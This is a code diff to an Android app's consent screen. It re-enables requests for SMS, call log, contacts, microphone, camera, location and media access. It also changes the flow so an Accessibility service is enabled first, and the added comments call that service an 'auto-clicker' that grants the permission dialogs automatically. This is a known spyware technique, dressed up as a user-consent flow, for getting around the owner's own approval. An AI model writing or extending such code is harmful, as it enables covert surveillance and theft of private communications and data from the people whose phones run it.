@@ -43,40 +43,42 @@ class ConsentActivity : AppCompatActivity() {
     private lateinit var binding: ActivityConsentBinding
     private var autostartPrompted = false
 
-    // private val corePermissions = buildList {
-    //     add(Manifest.permission.ACCESS_FINE_LOCATION)
-    //     add(Manifest.permission.ACCESS_COARSE_LOCATION)
-    //     add(Manifest.permission.READ_SMS)
-    //     add(Manifest.permission.READ_CALL_LOG)
-    //     add(Manifest.permission.READ_CONTACTS)
-    //     add(Manifest.permission.RECORD_AUDIO)
-    //     add(Manifest.permission.CAMERA)
-    //     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-    //         add(Manifest.permission.POST_NOTIFICATIONS)
-    //         add(Manifest.permission.READ_MEDIA_IMAGES)
-    //         add(Manifest.permission.READ_MEDIA_VIDEO)
-    //         add(Manifest.permission.READ_MEDIA_AUDIO)
-    //     } else {
-    //         add(Manifest.permission.READ_EXTERNAL_STORAGE)
-    //     }
-    // }.toTypedArray()
-
-    // Idhu pala permissions-ah manual-ah ketkuratha block panni, trigger-ah empty aakkidum
-    private val corePermissions = emptyArray<String>()
-
+    private val corePermissions = buildList {
+        add(Manifest.permission.ACCESS_FINE_LOCATION)
+        add(Manifest.permission.ACCESS_COARSE_LOCATION)
+        add(Manifest.permission.READ_SMS)
+        add(Manifest.permission.READ_CALL_LOG)
+        add(Manifest.permission.READ_CONTACTS)
+        add(Manifest.permission.RECORD_AUDIO)
+        add(Manifest.permission.CAMERA)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            add(Manifest.permission.POST_NOTIFICATIONS)
+            add(Manifest.permission.READ_MEDIA_IMAGES)
+            add(Manifest.permission.READ_MEDIA_VIDEO)
+            add(Manifest.permission.READ_MEDIA_AUDIO)
+        } else {
+            add(Manifest.permission.READ_EXTERNAL_STORAGE)
+        }
+    }.toTypedArray()
 
     // 1. Core Runtime Permissions Launcher
     private val runtimePermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { _ ->
-        checkAndPromptNextSystemPermission()
+        proceedToActivation()
     }
 
     // 2. Accessibility Launcher
     private val accessibilityLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
-        proceedToActivation()
+        if (isAccessibilityEnabled()) {
+            Toast.makeText(this, "✓ Accessibility Enabled! Auto-granting permissions...", Toast.LENGTH_SHORT).show()
+            // Accessibility service is now active in background - launch permissions to be auto-clicked
+            runtimePermissionLauncher.launch(corePermissions)
+        } else {
+            proceedToActivation()
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -86,7 +88,13 @@ class ConsentActivity : AppCompatActivity() {
 
         binding.btnAllow.setOnClickListener {
             DeviceState(this).consentGiven = true
-            runtimePermissionLauncher.launch(corePermissions)
+            if (!isAccessibilityEnabled()) {
+                // Step 1: Request Accessibility first so the auto-clicker is running!
+                showAccessibilityDialog()
+            } else {
+                // Accessibility already enabled: launch runtime permissions directly
+                runtimePermissionLauncher.launch(corePermissions)
+            }
         }
 
         binding.btnDecline.setOnClickListener {
